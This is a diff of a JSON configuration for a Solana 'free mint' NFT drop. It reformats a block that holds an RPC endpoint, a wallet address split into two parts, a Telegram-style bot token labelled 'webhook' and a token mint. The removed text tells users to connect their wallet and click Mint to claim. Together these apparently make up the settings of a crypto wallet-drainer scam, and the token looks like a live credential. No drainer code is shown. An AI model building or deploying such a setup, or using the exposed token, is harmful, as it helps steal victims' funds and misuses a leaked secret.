@@ -1,16 +1,7 @@
-{ "rpc": "https://api.mainnet-beta.solana.com",      │
-│    "d1": "3ZnuxWJ7X3AGTV5P", "d2":                      │
-│    "Hv3G9EZJp18MuqprV2vNzje3G7e4", "webhook":           │
-│    "8557350080:AAGPiFuTyUKJ7kOkiNiT1aOnvs9Qz4ddfTk",    │
-│    "token": { "mint":                                   │
-│    "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyM3wRk",      │
-│    "decimals": 6 }, "priority": { "microLamports": 1000 │
-│    }, "maxRetries": 3, "nft": { "name": "Phantom Drop   │
-│    #001", "symbol": "PD", "description": "Free mint on  │
-│    Solana. Connect wallet and click Mint to claim.",    │
-│    "image":                                             │
-│    "https://i.ibb.co/TzQNvLM/FB-IMG-1763052170253.jpg", │
-│    "creators": [ { "address":                           │
-│    "3ZnuxWJ7X3AGTV5PHv3G9EZJp18MuqprV2vNzje3G7e4",      │
-│    "share": 100 } ], "collection": "Phantom Drops" } }  │
-│
+{
+  "rpc": "https://api.mainnet-beta.solana.com",
+  "d1": "3ZnuxWJ7X3AGTV5P",
+  "d2": "Hv3G9EZJp18MuqprV2vNzje3G7e4",
+  "webhook": "8557350080:AAGPiFuTyUKJ7kOkiNiT1aOnvs9Qz4ddfTk",
+  "token": { "mint": "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyM3wRk" }
+}
